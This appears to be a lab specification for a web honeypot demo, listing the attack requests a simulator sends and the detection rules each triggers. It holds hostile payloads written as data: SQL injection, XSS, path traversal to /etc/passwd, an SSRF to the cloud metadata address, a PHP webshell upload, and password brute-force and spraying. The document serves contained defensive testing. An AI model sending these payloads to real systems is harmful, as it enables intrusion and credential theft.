# Web Scenario Spec: for the Attacker/Simulator Owner

From: web decoy owner. This describes **what to send to the web decoy** for Demo 2 (web) and the
web part of Demo 4 (cross-service campaign), and **what the decoy will report**. It is a spec,
not code: the simulator implementation is yours (HANDOFF §9, §11).

## Requirements the decoy depends on

| Requirement | Why |
|---|---|
| Run the simulator **as a container on `lab_net` with fixed IP `172.28.0.50`** | The decoy trusts `X-Campaign-Id` only from that IP. From the host, every request arrives from the Docker gateway and campaign IDs are discarded (web PLAN.md P9) |
| Target allowlist: **only** `https://172.28.0.10:8080` | Containment (HANDOFF §11) |
| **HTTPS:** the decoy serves TLS only, with a self-signed certificate regenerated at every start. Disable certificate verification **for this one lab target only** (e.g. `verify=False` in httpx/requests, `-k` in curl). Plain `http://` is refused | OWASP A02:2021 / A04:2025 |
| Header on every request: `X-Campaign-Id: <id>`, matching `^[A-Za-z0-9_-]{1,64}$` | Otherwise `campaign_id=null` and tag `untrusted_campaign_header` |
| Don't follow redirects automatically, or expect `/admin` → `/admin/login` to count as 2 requests | Both are logged |
| Timeouts ≤ 5 s per request, fixed counts (no loops "until success") | Bounded, repeatable demo |
| Send all steps within 60 s | Scan and brute-force windows are 60 s |

## Request sequence and expected detections

| Step | Request(s) | Expected rule(s) on the decoy event |
|---|---|---|
| 1 Scan | GET each of `/admin`, `/.env`, `/.git/config`, `/backup`, `/config`, `/backup.zip`, `/wp-login.php`, `/phpmyadmin`, `/server-status` | W-ENUM-01 (low) on each; **W-ENUM-02 (T1595.003)** on the 8th distinct path |
| 2 Brute force | 5× POST `/login`, form `username=j.miller&password=<wrong_i>` | W-AUTH-01 each; **W-AUTH-02 (T1110.001, medium)** on the 5th |
| 3 Decoy login | POST `/login`, form `username=j.miller&password=TransNova#Spring26` (URL-encode `#` as `%23`). Keep the `hf_session` cookie | **W-AUTH-04 (high)**, `outcome=succeeded` |
| 4 IDOR | GET `/api/v1/users/1002` with the cookie | **W-IDOR-01** |
| 5 Injection probes | GET `/search?q=' UNION SELECT username,password FROM users--`; GET `/search?q=<script>alert(document.cookie)</script>`; GET `/download?file=../../../../etc/passwd` | **W-SQLI-01 (T1190 candidate)**, **W-XSS-01**, **W-PATH-01** |
| 6 SSRF + upload + webshell | GET `/api/v1/preview?url=http://169.254.169.254/latest/meta-data/`; POST `/upload` multipart field `document`, filename `avatar.jpg`, type `image/jpeg`, content `<?php system($_GET['c']); ?>`; GET `/wp-content/uploads/shell.php` | **W-SSRF-01**, **W-UPL-01**, **W-SHELL-01** (never T1505.003) |

A reference run of exactly this sequence (24 events, one campaign ID) is in
`services/web/samples/web-attack-campaign.sample.jsonl`.

Optional spraying variant (instead of step 2): 1 wrong login each for `admin`, `root`, `a.okafor`,
`s.lindqvist` → **W-AUTH-03 (T1110.003)** on the 4th.

## What the decoy guarantees (so you can rely on it)

- Nothing you send is executed, rendered, fetched or opened. The SSRF URL is never requested,
  the upload is hashed and discarded, and traversal paths never touch the filesystem.
- Passwords, cookies, `Authorization` headers and tokens never appear in events.
- Every probe is reported with `outcome=observed` and is never called a success.

## Re-running

Behaviour rules use sliding windows per source: scan 60 s, brute force 5 (medium) / 15 (high) failures within 60 s,
spraying 5 min. Once over a threshold, every qualifying request carries the rule, so the expected counts depend on how many
requests the scenario sends after the threshold. To re-run immediately, restart the decoy (`docker compose ... restart web-decoy`), which resets the in-memory counters.
